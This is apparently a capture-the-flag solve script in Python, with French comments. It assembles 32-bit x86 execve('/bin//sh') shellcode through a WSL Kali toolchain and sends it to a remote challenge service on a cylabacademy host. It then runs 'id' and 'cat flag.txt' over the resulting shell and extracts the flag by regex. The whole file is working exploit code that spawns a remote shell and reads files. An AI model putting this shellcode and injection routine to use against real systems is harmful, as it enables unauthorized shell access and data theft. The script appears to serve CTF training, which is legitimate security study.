import sys, socket, time, re, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

asm = r"""
.intel_syntax noprefix
.global _start
_start:
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
"""
open("/tmp/sc.asm", "w").write(asm)
r = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-lc",
                    "cd /tmp && as --32 -o sc.o sc.asm && ld -m elf_i386 -o sc sc.o && objcopy -O binary -j .text sc sc.bin && xxd -p sc.bin | tr -d '\\n'"],
                   capture_output=True, text=True)
hexsc = (r.stdout or "").strip()
print("hex:", hexsc[:120], "err:", (r.stderr or "")[:200])
if not hexsc:
    sys.exit(1)
sc = bytes.fromhex(hexsc)
print("shellcode len:", len(sc), sc.hex())
HOST, PORT = "xebec.cylabacademy.net", 29985
try:
    s = socket.create_connection((HOST, PORT), timeout=12)
    s.settimeout(4)
    time.sleep(0.8)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(sc + b"\n")
    time.sleep(1.0)
    try:
        print("apres:", s.recv(4096).decode("utf-8", "replace")[:200])
    except Exception as e:
        print("pas de sortie", type(e).__name__)
    s.sendall(b"echo PWNED; id; cat flag.txt; cat /flag.txt\n")
    time.sleep(1.5)
    out = ""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk:
                break
            out += chunk.decode("utf-8", "replace")
    except Exception:
        pass
    print("=== SORTIE ===")
    print(out[:1500])
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", out)
    if m:
        print("FLAG:", m.group(0))
    s.close()
except Exception as e:
    print("err", type(e).__name__, e)
